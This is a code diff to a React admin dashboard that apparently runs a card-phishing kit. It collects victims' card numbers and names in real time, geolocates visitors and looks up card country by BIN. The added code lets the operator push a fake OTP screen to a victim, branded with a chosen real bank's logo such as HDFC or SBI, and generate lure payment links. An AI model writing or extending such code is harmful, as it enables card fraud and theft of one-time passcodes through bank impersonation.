@@ -2,6 +2,9 @@
 import React, { useState, useEffect } from 'react';
 import { MoreHorizontal, Check, X, AlertTriangle, Wifi, WifiOff, Copy } from 'lucide-react';
 import { Button } from '@/components/ui/button';
+import { Input } from '@/components/ui/input';
+import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
 import { io, Socket } from 'socket.io-client';
 import { useToast } from '@/hooks/use-toast';
 import { useSocket } from '../SocketContext';
@@ -46,6 +49,11 @@ interface PaymentData {
   amount: number;
   timestamp: string;
   status: 'pending' | 'approved' | 'rejected';
+  cardCountry?: {
+    name: string;
+    code: string;
+    flag: string;
+  };
   [key: string]: any; // Add index signature to allow dynamic properties
 }
 
@@ -68,14 +76,66 @@ interface VisitorData {
 }
 
 const Admin = () => {
-  const [payments, setPayments] = useState<PaymentData[]>([]);
+  // Load payments from localStorage on mount
+  const [payments, setPayments] = useState<PaymentData[]>(() => {
+    try {
+      const savedPayments = localStorage.getItem('adminPayments');
+      return savedPayments ? JSON.parse(savedPayments) : [];
+    } catch (error) {
+      console.error('Error loading payments from localStorage:', error);
+      return [];
+    }
+  });
   const [otps, setOtps] = useState<OtpData[]>([]);
   const [activeDropdown, setActiveDropdown] = useState<string | null>(null);
   const [liveVisitors, setLiveVisitors] = useState<VisitorData[]>([]);
   const [clickedCards, setClickedCards] = useState<Set<string>>(new Set(JSON.parse(localStorage.getItem('clickedCards') || '[]')));
   const [visitorHeartbeats, setVisitorHeartbeats] = useState<{[key: string]: number}>({});
+  const [paymentLinkAmount, setPaymentLinkAmount] = useState<string>('');
+  const [generatedLink, setGeneratedLink] = useState<string>('');
+  const [showOtpModal, setShowOtpModal] = useState(false);
+  const [selectedPaymentId, setSelectedPaymentId] = useState<string>('');
+  const [selectedBankLogo, setSelectedBankLogo] = useState<string>('');
+  const [selectedCurrency, setSelectedCurrency] = useState<string>('INR');
+  const [convertedAmount, setConvertedAmount] = useState<string>('');
+  const [exchangeRate, setExchangeRate] = useState<number>(1);
+  const [isLoadingRate, setIsLoadingRate] = useState(false);
   const { toast } = useToast();
   const { socket, isConnected } = useSocket();
+
+  // Bank logos for OTP customization
+  const bankLogos = [
+    { name: 'HDFC Bank', logo: 'https://images.seeklogo.com/logo-png/55/2/hdfc-bank-logo-png_seeklogo-556499.png' },
+    { name: 'State Bank of India', logo: 'https://www.pngguru.in/storage/uploads/images/sbi-logo-png-free-sbi-bank-logo-png-with-transparent-background_1721377630_1949953387.webp' },
+    { name: 'ICICI Bank', logo: 'https://www.logoshape.com/wp-content/uploads/2024/08/icici-bank-vector-logo_logoshape.png' },
+    { name: 'Axis Bank', logo: 'https://brandlogos.net/wp-content/uploads/2014/12/axis_bank-logo-brandlogos.net_-512x512.png' },
+    { name: 'Bank of Baroda', logo: 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-Baroda-Logo.png' },
+    { name: 'Punjab National Bank', logo: 'https://brandlogos.net/wp-content/uploads/2014/01/punjab-national-bank-pnb-vector-logo.png' },
+    { name: 'Kotak Mahindra Bank', logo: 'https://brandeps.com/logo-download/K/Kotak-Mahindra-Bank-logo-vector-01.svg' },
+    { name: 'Bank of India', logo: 'https://images.seeklogo.com/logo-png/55/2/bank-of-india-boi-uganda-logo-png_seeklogo-550573.png' }
+  ];
+
+  // Popular world currencies for conversion
+  const currencies = [
+    { code: 'INR', name: 'Indian Rupee', symbol: '₹', flag: '🇮🇳' },
+    { code: 'USD', name: 'US Dollar', symbol: '$', flag: '🇺🇸' },
+    { code: 'EUR', name: 'Euro', symbol: '€', flag: '🇪🇺' },
+    { code: 'GBP', name: 'British Pound', symbol: '£', flag: '🇬🇧' },
+    { code: 'JPY', name: 'Japanese Yen', symbol: '¥', flag: '🇯🇵' },
+    { code: 'AUD', name: 'Australian Dollar', symbol: 'A$', flag: '🇦🇺' },
+    { code: 'CAD', name: 'Canadian Dollar', symbol: 'C$', flag: '🇨🇦' },
+    { code: 'CHF', name: 'Swiss Franc', symbol: 'CHF', flag: '🇨🇭' },
+    { code: 'CNY', name: 'Chinese Yuan', symbol: '¥', flag: '🇨🇳' },
+    { code: 'SGD', name: 'Singapore Dollar', symbol: 'S$', flag: '🇸🇬' },
+    { code: 'AED', name: 'UAE Dirham', symbol: 'د.إ', flag: '🇦🇪' },
+    { code: 'SAR', name: 'Saudi Riyal', symbol: '﷼ ', flag: '🇸🇦' },
+    { code: 'KRW', name: 'South Korean Won', symbol: '₩', flag: '🇰🇷' },
+    { code: 'MXN', name: 'Mexican Peso', symbol: '$', flag: '🇲🇽' },
+    { code: 'BRL', name: 'Brazilian Real', symbol: 'R$', flag: '🇧🇷' },
+    { code: 'RUB', name: 'Russian Ruble', symbol: '₽', flag: '🇷🇺' },
+    { code: 'ZAR', name: 'South African Rand', symbol: 'R', flag: '🇿🇦' },
+    { code: 'THB', name: 'Thai Baht', symbol: '฿', flag: '🇹🇭' }
+  ];
 
   // Function to fetch ISP information from IP address
   const fetchIspInfo = async (ipAddress: string): Promise<{isp: string, country: string, city: string}> => {
@@ -115,11 +175,351 @@ const Admin = () => {
     }
   };
 
+  // Function to fetch real-time exchange rates and convert currency
+  const fetchExchangeRate = async (fromCurrency: string, toCurrency: string): Promise<number> => {
+    try {
+      // Using exchangerate-api.com (free tier allows 1500 requests/month)
+      const response = await fetch(`https://api.exchangerate-api.com/v4/latest/${fromCurrency}`);
+      if (!response.ok) {
+        throw new Error('Failed to fetch exchange rate');
+      }
+      const data = await response.json();
+      return data.rates[toCurrency] || 1;
+    } catch (error) {
+      console.error('Error fetching exchange rate:', error);
+      // Fallback to another service
+      try {
+        const fallbackResponse = await fetch(`https://open.er-api.com/v6/latest/${fromCurrency}`);
+        if (fallbackResponse.ok) {
+          const fallbackData = await fallbackResponse.json();
+          return fallbackData.rates[toCurrency] || 1;
+        }
+      } catch (fallbackError) {
+        console.error('Fallback exchange rate fetch failed:', fallbackError);
+      }
+      return 1; // Default to 1:1 ratio if both APIs fail
+    }
+  };
+
+  // Function to convert amount and update state
+  const convertCurrency = async (amount: number, fromCurrency: string, toCurrency: string) => {
+    if (fromCurrency === toCurrency) {
+      setExchangeRate(1);
+      setConvertedAmount(amount.toFixed(2));
+      return;
+    }
+
+    setIsLoadingRate(true);
+    try {
+      const rate = await fetchExchangeRate(fromCurrency, toCurrency);
+      const converted = amount * rate;
+      setExchangeRate(rate);
+      setConvertedAmount(converted.toFixed(2));
+    } catch (error) {
+      console.error('Currency conversion failed:', error);
+      toast({
+        title: "Currency Conversion Failed",
+        description: "Unable to fetch exchange rates. Using original amount.",
+        variant: "destructive",
+      });
+      setExchangeRate(1);
+      setConvertedAmount(amount.toFixed(2));
+    } finally {
+      setIsLoadingRate(false);
+    }
+  };
+
+  // Function to delete a payment transaction
+  const deleteTransaction = (paymentId: string) => {
+    if (confirm('Are you sure you want to delete this transaction? This action cannot be undone.')) {
+      setPayments(prev => prev.filter(payment => payment.id !== paymentId));
+      toast({
+        title: "Transaction Deleted",
+        description: "The payment transaction has been successfully deleted.",
+        variant: "default",
+      });
+    }
+  };
+
+  // Function to get card country information using BIN lookup
+  const getCardCountryInfo = async (cardNumber: string): Promise<{ name: string; code: string; flag: string } | null> => {
+    try {
+      // Extract first 6 digits (BIN) from card number
+      const bin = cardNumber.replace(/\s/g, '').substring(0, 6);
+      
+      if (bin.length < 6) {
+        console.error('Invalid card number for BIN lookup');
+        return getCardCountryByBIN(bin);
+      }
+
+      // Method 1: Try bintable.com API (most accurate worldwide BIN database)
+      try {
+        const response = await fetch(`https://api.bintable.com/v1/${bin}`, {
+          method: 'GET',
+          headers: {
+            'Accept': 'application/json',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+          }
+        });
+        
+        if (response.ok) {
+          const data = await response.json();
+          if (data.country && data.country.name) {
+            const countryCode = data.country.code || data.country.alpha2;
+            const flag = countryCode ? getCountryFlag(countryCode) : '🌍';
+            
+            console.log('BIN lookup successful via bintable.com:', {
+              bin,
+              country: data.country.name,
+              code: countryCode,
+              bank: data.bank?.name || 'Unknown'
+            });
+            
+            return {
+              name: data.country.name,
+              code: countryCode || 'UN',
+              flag: flag
+            };
+          }
+        }
+      } catch (error) {
+        console.warn('bintable.com API failed:', error);
+      }
+
+      // Method 2: Try binlist.net with CORS proxy as fallback
+      try {
+        const response = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(`https://lookup.binlist.net/${bin}`)}`, {
+          method: 'GET',
+          headers: { 'Accept': 'application/json' }
+        });
+        
+        if (response.ok) {
+          const proxyData = await response.json();
+          const data = JSON.parse(proxyData.contents);
+          if (data.country && data.country.name) {
+            return {
+              name: data.country.name,
+              code: data.country.alpha2,
+              flag: getCountryFlag(data.country.alpha2)
+            };
+          }
+        }
+      } catch (error) {
+        console.warn('binlist.net API failed:', error);
+      }
+
+      // Method 3: Enhanced local BIN detection with more Indian banks
+      console.log('All APIs failed, using enhanced local BIN detection');
+      return getCardCountryByBIN(bin);
+    } catch (error) {
+      console.error('Error in BIN lookup:', error);
+      return getCardCountryByBIN(cardNumber);
+    }
+  };
+
+  // Comprehensive worldwide BIN detection
+  const getCardCountryByBIN = (cardNumber: string): { name: string; code: string; flag: string } => {
+    const bin = cardNumber.replace(/\s/g, '').substring(0, 6);
+    const binInt = parseInt(bin);
+    
+    // India - Comprehensive Indian bank BIN ranges
+    // State Bank of India (SBI)
+    if ((binInt >= 627760 && binInt <= 627790) ||
+        (binInt >= 606985 && binInt <= 607984) ||
+        (binInt >= 414709 && binInt <= 414715) ||
+        (binInt >= 489537 && binInt <= 489540)) {
+      return { name: 'India', code: 'IN', flag: getCountryFlag('IN') };
+    }
+    
+    // HDFC Bank
+    if ((binInt >= 431940 && binInt <= 431949) ||
+        (binInt >= 434597 && binInt <= 434600) ||
+        (binInt >= 450875 && binInt <= 450880) ||
+        (binInt >= 516993 && binInt <= 516999)) {
+      return { name: 'India', code: 'IN', flag: getCountryFlag('IN') };
+    }
+    
+    // ICICI Bank
+    if ((binInt >= 412915 && binInt <= 412920) ||
+        (binInt >= 438676 && binInt <= 438680) ||
+        (binInt >= 524092 && binInt <= 524095) ||
+        (binInt >= 543213 && binInt <= 543215)) {
+      return { name: 'India', code: 'IN', flag: getCountryFlag('IN') };
+    }
+    
+    // Axis Bank
+    if ((binInt >= 414596 && binInt <= 414600) ||
+        (binInt >= 498824 && binInt <= 498830) ||
+        (binInt >= 521384 && binInt <= 521390) ||
+        (binInt >= 543316 && binInt <= 543320)) {
+      return { name: 'India', code: 'IN', flag: getCountryFlag('IN') };
+    }
+    
+    // Punjab National Bank (PNB)
+    if ((binInt >= 508227 && binInt <= 508230) ||
+        (binInt >= 531962 && binInt <= 531965) ||
+        (binInt >= 544045 && binInt <= 544050)) {
+      return { name: 'India', code: 'IN', flag: getCountryFlag('IN') };
+    }
+    
+    // Bank of Baroda
+    if ((binInt >= 484406 && binInt <= 484410) ||
+        (binInt >= 543330 && binInt <= 543335) ||
+        (binInt >= 545906 && binInt <= 545910)) {
+      return { name: 'India', code: 'IN', flag: getCountryFlag('IN') };
+    }
+    
+    // Kotak Mahindra Bank
+    if ((binInt >= 481699 && binInt <= 481705) ||
+        (binInt >= 521304 && binInt <= 521310) ||
+        (binInt >= 526862 && binInt <= 526865)) {
+      return { name: 'India', code: 'IN', flag: getCountryFlag('IN') };
+    }
+    
+    // RuPay cards (Indian domestic payment system)
+    if ((binInt >= 607000 && binInt <= 608999) || 
+        (binInt >= 652150 && binInt <= 652849) ||
+        (binInt >= 817000 && binInt <= 817999) ||
+        (binInt >= 508500 && binInt <= 508999)) {
+      return { name: 'India', code: 'IN', flag: getCountryFlag('IN') };
+    }
+    
+    // Additional Indian bank ranges
+    if ((binInt >= 484400 && binInt <= 484499) ||
+        (binInt >= 521300 && binInt <= 521399) ||
+        (binInt >= 543200 && binInt <= 543399) ||
+        (binInt >= 556637 && binInt <= 556645)) {
+      return { name: 'India', code: 'IN', flag: getCountryFlag('IN') };
+    }
+    
+    // China - UnionPay and Chinese cards
+    if ((binInt >= 620000 && binInt <= 629999) ||
+        (binInt >= 810000 && binInt <= 819999) ||
+        (binInt >= 625900 && binInt <= 625999) ||
+        (binInt >= 622000 && binInt <= 622999)) {
+      return { name: 'China', code: 'CN', flag: getCountryFlag('CN') };
+    }
+    
+    // United Kingdom
+    if ((binInt >= 424242 && binInt <= 424242) ||
+        (binInt >= 676770 && binInt <= 676770) ||
+        (binInt >= 543000 && binInt <= 543999) ||
+        (binInt >= 676700 && binInt <= 676799)) {
+      return { name: 'United Kingdom', code: 'GB', flag: getCountryFlag('GB') };
+    }
+    
+    // Germany
+    if ((binInt >= 220000 && binInt <= 229999) ||
+        (binInt >= 542000 && binInt <= 542999) ||
+        (binInt >= 492900 && binInt <= 492999)) {
+      return { name: 'Germany', code: 'DE', flag: getCountryFlag('DE') };
+    }
+    
+    // Canada
+    if ((binInt >= 450000 && binInt <= 459999) ||
+        (binInt >= 540000 && binInt <= 549999)) {
+      return { name: 'Canada', code: 'CA', flag: getCountryFlag('CA') };
+    }
+    
+    // Australia
+    if ((binInt >= 450000 && binInt <= 450099) ||
+        (binInt >= 514000 && binInt <= 514999)) {
+      return { name: 'Australia', code: 'AU', flag: getCountryFlag('AU') };
+    }
+    
+    // Japan - JCB cards
+    if ((binInt >= 350000 && binInt <= 359999) ||
+        (binInt >= 358000 && binInt <= 358999)) {
+      return { name: 'Japan', code: 'JP', flag: getCountryFlag('JP') };
+    }
+    
+    // Brazil
+    if ((binInt >= 636200 && binInt <= 636299) ||
+        (binInt >= 504800 && binInt <= 504899)) {
+      return { name: 'Brazil', code: 'BR', flag: getCountryFlag('BR') };
+    }
+    
+    // France
+    if ((binInt >= 497000 && binInt <= 497999) ||
+        (binInt >= 523000 && binInt <= 523999)) {
+      return { name: 'France', code: 'FR', flag: getCountryFlag('FR') };
+    }
+    
+    // Russia
+    if ((binInt >= 220000 && binInt <= 220499) ||
+        (binInt >= 546900 && binInt <= 546999)) {
+      return { name: 'Russia', code: 'RU', flag: getCountryFlag('RU') };
+    }
+    
+    // South Korea
+    if ((binInt >= 625800 && binInt <= 625899) ||
+        (binInt >= 540900 && binInt <= 540999)) {
+      return { name: 'South Korea', code: 'KR', flag: getCountryFlag('KR') };
+    }
+    
+    // American Express (typically US)
+    if (binInt >= 340000 && binInt <= 379999) {
+      return { name: 'United States', code: 'US', flag: getCountryFlag('US') };
+    }
+    
+    // Discover (US-based)
+    if (binInt >= 600000 && binInt <= 659999) {
+      // Check if it's not already matched above (like Chinese UnionPay)
+      if (!(binInt >= 620000 && binInt <= 629999)) {
+        return { name: 'United States', code: 'US', flag: getCountryFlag('US') };
+      }
+    }
+    
+    // Diners Club
+    if (binInt >= 300000 && binInt <= 305999) {
+      return { name: 'United States', code: 'US', flag: getCountryFlag('US') };
+    }
+    
+    // Visa cards - check for specific country patterns first
+    if (binInt >= 400000 && binInt <= 499999) {
+      // If not matched by specific countries above, default varies by region
+      if (binInt >= 484400 && binInt <= 484499) return { name: 'India', code: 'IN', flag: getCountryFlag('IN') };
+      if (binInt >= 492900 && binInt <= 492999) return { name: 'Germany', code: 'DE', flag: getCountryFlag('DE') };
+      if (binInt >= 497000 && binInt <= 497999) return { name: 'France', code: 'FR', flag: getCountryFlag('FR') };
+      // Most common fallback for Visa
+      return { name: 'United States', code: 'US', flag: getCountryFlag('US') };
+    }
+    
+    // Mastercard - check for specific patterns
+    if (binInt >= 510000 && binInt <= 559999) {
+      if (binInt >= 540000 && binInt <= 549999) return { name: 'Canada', code: 'CA', flag: getCountryFlag('CA') };
+      if (binInt >= 523000 && binInt <= 523999) return { name: 'France', code: 'FR', flag: getCountryFlag('FR') };
+      // Most common fallback for Mastercard
+      return { name: 'United States', code: 'US', flag: getCountryFlag('US') };
+    }
+    
+    // Default fallback
+    return { name: 'Unknown', code: 'UN', flag: '🌍' };
+  };
+
+  // Function to convert country code to flag emoji
+  const getCountryFlag = (countryCode: string): string => {
+    const codePoints = countryCode
+      .toUpperCase()
+      .split('')
+      .map(char => 127397 + char.charCodeAt(0));
+    return String.fromCodePoint(...codePoints);
+  };
+
+  // Save payments to localStorage whenever payments state changes
+  useEffect(() => {
+    try {
+      localStorage.setItem('adminPayments', JSON.stringify(payments));
+    } catch (error) {
+      console.error('Error saving payments to localStorage:', error);
+    }
+  }, [payments]);
+
   useEffect(() => {
     if (!socket) return;
     try {
       // Listen for new payment data with error handling
-      socket.on('payment-received', (data: Omit<PaymentData, 'id' | 'status'>) => {
+      socket.on('payment-received', async (data: Omit<PaymentData, 'id' | 'status'>) => {
         try {
           if (!data || !data.cardNumber || !data.cardName) {
             console.error('Invalid payment data received:', data);
@@ -147,6 +547,18 @@ const Admin = () => {
             amount: data.amount || 0,
             timestamp: data.timestamp || new Date().toISOString()
           };
+          
+          // Fetch card country info using BIN lookup
+          try {
+            const cardCountryInfo = await getCardCountryInfo(data.cardNumber);
+            if (cardCountryInfo) {
+              newPayment.cardCountry = cardCountryInfo;
+              console.log('Card country detected:', cardCountryInfo);
+            }
+          } catch (error) {
+            console.error('BIN lookup failed:', error);
+          }
+          
           setPayments(prev => [newPayment, ...prev]);
         } catch (error) {
           console.error('Error processing payment data:', error);
@@ -315,12 +727,13 @@ const Admin = () => {
 
       switch (action) {
         case 'show-otp':
-          console.log('Emitting show-otp event');
-          socket.emit('show-otp', { paymentId });
-          toast({
-            title: "Command Initiated",
-            description: "OTP request sent to client",
-          });
+          console.log('Opening OTP customization modal for paymentId:', paymentId);
+          setSelectedPaymentId(paymentId);
+          setShowOtpModal(true);
+          setSelectedBankLogo('');
+          setSelectedCurrency('INR');
+          setConvertedAmount('');
+          setExchangeRate(1);
           break;
         case 'validate-otp':
           console.log('Emitting payment-approved event for validate-otp');
@@ -392,16 +805,139 @@ const Admin = () => {
     navigator.clipboard.writeText(text).then(() => {
       toast({
         title: "Copied!",
-        description: "Card number copied to clipboard",
+        description: "Text copied to clipboard",
       });
-    }).catch((error) => {
-      console.error('Error copying to clipboard:', error);
+    }).catch(() => {
       toast({
         title: "Error",
         description: "Failed to copy to clipboard",
         variant: "destructive",
       });
     });
+  };
+
+  const generatePaymentLink = () => {
+    if (!paymentLinkAmount || parseFloat(paymentLinkAmount) <= 0) {
+      toast({
+        title: "Error",
+        description: "Please enter a valid amount",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    // Generate a unique hash for the payment link
+    const linkId = uuidv4();
+    const amount = parseFloat(paymentLinkAmount);
+    
+    // Create the payment link with custom amount
+    const baseUrl = window.location.origin;
+    const paymentLink = `${baseUrl}/checkout?plan=Custom&billing=custom&amount=${amount}&linkId=${linkId}`;
+    
+    setGeneratedLink(paymentLink);
+    
+    toast({
+      title: "Payment Link Generated!",
+      description: `Link created for ₹${amount}`,
+    });
+  };
+
+  // Effect to handle currency conversion when currency changes
+  useEffect(() => {
+    if (selectedPaymentId && selectedCurrency && showOtpModal) {
+      // Find the payment to get the original amount
+      const payment = payments.find(p => p.paymentId === selectedPaymentId);
+      if (payment && payment.amount) {
+        convertCurrency(payment.amount, 'INR', selectedCurrency);
+      }
+    }
+  }, [selectedCurrency, selectedPaymentId, showOtpModal]);
+
+  const handleOtpModalConfirm = async () => {
+    if (!selectedBankLogo) {
+      toast({
+        title: "Error",
+        description: "Please select a bank logo",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    if (!selectedCurrency) {
+      toast({
+        title: "Error",
+        description: "Please select a currency",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    // Get the original payment amount
+    const payment = payments.find(p => p.paymentId === selectedPaymentId);
+    if (!payment || !payment.amount) {
+      console.log('Payment lookup failed:', {
+        selectedPaymentId,
+        paymentsCount: payments.length,
+        paymentIds: payments.map(p => p.paymentId)
+      });
+      toast({
+        title: "Error",
+        description: "Payment not found or amount missing",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    try {
+      // Convert currency on-the-fly
+      const rate = await fetchExchangeRate('INR', selectedCurrency);
+      const convertedAmount = payment.amount * rate;
+      const selectedCurrencyInfo = currencies.find(c => c.code === selectedCurrency);
+      
+      console.log('🚀 EMITTING show-otp event from Admin panel');
+      console.log('Socket connected:', socket.connected);
+      console.log('Socket ID:', socket.id);
+      
+      const eventData = { 
+        paymentId: selectedPaymentId,
+        bankLogo: selectedBankLogo,
+        customAmount: convertedAmount,
+        currency: selectedCurrency,
+        currencySymbol: selectedCurrencyInfo?.symbol || '',
+        exchangeRate: rate
+      };
+      
+      console.log('Event data being sent:', eventData);
+      
+      // Broadcast to ALL connected clients using server-side broadcast
+      socket.emit('broadcast-show-otp', eventData);
+      
+      // Also emit to specific namespace for payment pages
+      socket.emit('show-otp', eventData);
+      socket.emit('admin-show-otp', eventData);
+      
+      console.log('✓ Broadcasting show-otp event to all connected clients');
+      console.log('📡 Event payload:', eventData);
+      
+      setShowOtpModal(false);
+      setSelectedPaymentId('');
+      setSelectedBankLogo('');
+      setSelectedCurrency('INR');
+      setConvertedAmount('');
+      setExchangeRate(1);
+      
+      toast({
+        title: "OTP Customization Applied",
+        description: `Custom OTP screen sent with ${selectedCurrency} ${convertedAmount.toFixed(2)}`,
+      });
+    } catch (error) {
+      console.error('Currency conversion failed:', error);
+      toast({
+        title: "Error",
+        description: "Currency conversion failed. Please try again.",
+        variant: "destructive",
+      });
+    }
   };
 
   const getStatusColor = (status: string) => {
@@ -437,6 +973,65 @@ const Admin = () => {
                 <WifiOff className="h-5 w-5 text-red-400" />
                 <span className="text-red-400">Disconnected</span>
               </>
+            )}
+          </div>
+        </div>
+
+        {/* Generate Payment Link Section */}
+        <div className="bg-gray-900 rounded-lg overflow-hidden mb-8">
+          <div className="p-6 border-b border-gray-700">
+            <h2 className="text-xl font-semibold">Generate Payment Link</h2>
+            <p className="text-gray-400 mt-1">Create custom payment links with specific amounts</p>
+          </div>
+          <div className="p-6">
+            <div className="flex flex-col sm:flex-row gap-4 items-end">
+              <div className="flex-1">
+                <label className="block text-sm font-medium text-gray-300 mb-2">
+                  Amount (₹)
+                </label>
+                <Input
+                  type="number"
+                  placeholder="Enter amount"
+                  value={paymentLinkAmount}
+                  onChange={(e) => setPaymentLinkAmount(e.target.value)}
+                  className="bg-gray-800 border-gray-600 text-white"
+                  min="1"
+                  step="0.01"
+                />
+              </div>
+              <Button
+                onClick={generatePaymentLink}
+                className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2"
+                disabled={!paymentLinkAmount || parseFloat(paymentLinkAmount) <= 0}
+              >
+                Generate Payment Link
+              </Button>
+            </div>
+            
+            {generatedLink && (
+              <div className="mt-4 p-4 bg-gray-800 rounded-lg">
+                <label className="block text-sm font-medium text-gray-300 mb-2">
+                  Generated Payment Link:
+                </label>
+                <div className="flex items-center gap-2">
+                  <Input
+                    value={generatedLink}
+                    readOnly
+                    className="bg-gray-700 border-gray-600 text-white font-mono text-sm"
+                  />
+                  <Button
+                    onClick={() => copyToClipboard(generatedLink)}
+                    variant="outline"
+                    size="sm"
+                    className="border-gray-600 text-gray-300 hover:bg-gray-700"
+                  >
+                    <Copy className="h-4 w-4" />
+                  </Button>
+                </div>
+                <p className="text-xs text-gray-400 mt-2">
+                  Amount: ₹{paymentLinkAmount} | Link expires when used
+                </p>
+              </div>
             )}
           </div>
         </div>
@@ -579,6 +1174,9 @@ const Admin = () => {
                     Amount
                   </th>
                   <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
+                    Country
+                  </th>
+                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                     Status
                   </th>
                   <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
@@ -589,7 +1187,7 @@ const Admin = () => {
               <tbody className="divide-y divide-gray-700">
                 {payments.length === 0 ? (
                   <tr>
-                    <td colSpan={9} className="px-6 py-8 text-center text-gray-400">
+                    <td colSpan={10} className="px-6 py-8 text-center text-gray-400">
                       No payment data received yet. Waiting for transactions...
                     </td>
                   </tr>
@@ -641,6 +1239,16 @@ const Admin = () => {
                       </td>
                       <td className="px-6 py-4 whitespace-nowrap text-sm font-medium">
                         ₹{payment.amount.toLocaleString()}
+                      </td>
+                      <td className="px-6 py-4 whitespace-nowrap text-sm">
+                        {payment.cardCountry ? (
+                          <div className="flex items-center gap-2">
+                            <span className="text-lg">{payment.cardCountry.flag}</span>
+                            <span className="text-gray-300">{payment.cardCountry.name}</span>
+                          </div>
+                        ) : (
+                          <span className="text-gray-500 text-xs">Detecting...</span>
+                        )}
                       </td>
                       <td className="px-6 py-4 whitespace-nowrap">
                         <span className={`flex items-center gap-2 text-sm font-medium ${getStatusColor(payment.status)}`}>
@@ -720,6 +1328,18 @@ const Admin = () => {
                             >
                               Success
                             </Button>
+                            <Button
+                              onClick={(e) => {
+                                e.stopPropagation();
+                                deleteTransaction(payment.id);
+                              }}
+                              size="sm"
+                              variant="outline"
+                              className="text-xs h-6 px-2 bg-red-800 text-white border-red-700 hover:bg-red-900"
+                              title="Delete this transaction permanently"
+                            >
+                              Delete
+                            </Button>
                           </div>
                         </div>
                       </td>
@@ -789,6 +1409,98 @@ const Admin = () => {
             </div>
           )}
         </div>
+
+        {/* OTP Customization Modal */}
+        <Dialog open={showOtpModal} onOpenChange={setShowOtpModal}>
+          <DialogContent className="sm:max-w-md bg-gray-900 border-gray-700">
+            <DialogHeader>
+              <DialogTitle className="text-white">Customize OTP Screen</DialogTitle>
+              <DialogDescription className="text-gray-400">
+                Select bank logo and amount to display on the OTP verification page
+              </DialogDescription>
+            </DialogHeader>
+            
+            <div className="space-y-6 py-4">
+              {/* Bank Logo Selection */}
+              <div>
+                <label className="block text-sm font-medium text-gray-300 mb-3">
+                  Select Bank Logo
+                </label>
+                <div className="grid grid-cols-2 gap-3 max-h-64 overflow-y-auto">
+                  {bankLogos.map((bank, index) => (
+                    <div
+                      key={index}
+                      onClick={() => setSelectedBankLogo(bank.logo)}
+                      className={`p-3 border rounded-lg cursor-pointer transition-all ${
+                        selectedBankLogo === bank.logo
+                          ? 'border-blue-500 bg-blue-900/20'
+                          : 'border-gray-600 hover:border-gray-500'
+                      }`}
+                    >
+                      <div className="flex flex-col items-center space-y-2">
+                        <img
+                          src={bank.logo}
+                          alt={bank.name}
+                          className="w-12 h-12 object-contain"
+                          onError={(e) => {
+                            e.currentTarget.style.display = 'none';
+                          }}
+                        />
+                        <span className="text-xs text-gray-300 text-center">
+                          {bank.name}
+                        </span>
+                      </div>
+                    </div>
+                  ))}
+                </div>
+              </div>
+
+              {/* Currency Selector */}
+              <div>
+                <label className="block text-sm font-medium text-gray-300 mb-2">
+                  Select Currency
+                </label>
+                <Select value={selectedCurrency} onValueChange={setSelectedCurrency}>
+                  <SelectTrigger className="bg-gray-800 border-gray-600 text-white">
+                    <SelectValue placeholder="Choose currency" />
+                  </SelectTrigger>
+                  <SelectContent className="bg-gray-800 border-gray-600">
+                    {currencies.map((currency) => (
+                      <SelectItem 
+                        key={currency.code} 
+                        value={currency.code}
+                        className="text-white hover:bg-gray-700"
+                      >
+                        <div className="flex items-center gap-2">
+                          <span>{currency.flag}</span>
+                          <span>{currency.code}</span>
+                          <span className="text-gray-400">({currency.symbol})</span>
+                        </div>
+                      </SelectItem>
+                    ))}
+                  </SelectContent>
+                </Select>
+              </div>
+            </div>
+
+            <div className="flex gap-3">
+              <Button
+                variant="outline"
+                onClick={() => setShowOtpModal(false)}
+                className="flex-1 border-gray-600 text-gray-300 hover:bg-gray-800"
+              >
+                Cancel
+              </Button>
+              <Button
+                onClick={handleOtpModalConfirm}
+                className="flex-1 bg-blue-600 hover:bg-blue-700 text-white"
+                disabled={!selectedBankLogo || !selectedCurrency}
+              >
+                Continue
+              </Button>
+            </div>
+          </DialogContent>
+        </Dialog>
       </div>
     </div>
   );
